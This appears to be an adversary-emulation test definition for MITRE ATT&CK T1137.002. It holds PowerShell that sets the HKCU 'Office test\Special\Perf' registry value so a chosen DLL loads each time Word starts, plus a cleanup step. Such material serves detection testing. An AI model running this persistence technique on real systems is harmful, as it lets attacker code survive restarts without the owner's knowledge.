api_version: "2.0"
name: Office Application Startup Test Persistence (HKCU)
description: |
    Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office
    application is started. Key is used for debugging purposes. Not created by default & exist in HKCU & HKLM hives.
uuid: c3e35b58-fe1c-480b-b540-7600fb612563
mitre:
    tactics:
        - 'TA0003: Persistence'
    techniques:
        - 'T1137: Office Application Startup'
    subtechniques:
        - 'T1137.002: Office Test'
requirements:
    platforms:
        - os: windows
steps:
    - name: office-application-startup-test-persistence-(hkcu)
      inline: "$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x64.dll\" /f       \n}\nelse{\n  Write-Host \"32-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"PathToAtomicsFolder\\T1137.002\\bin\\officetest_x86.dll\" /f\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\"\n"
      executor: powershell
      cleanup:
        inline: |-
            Stop-Process -Name "notepad","WinWord" -ErrorAction Ignore
            Remove-Item "HKCU:\Software\Microsoft\Office test\Special\Perf" -ErrorAction Ignore
        executor: powershell
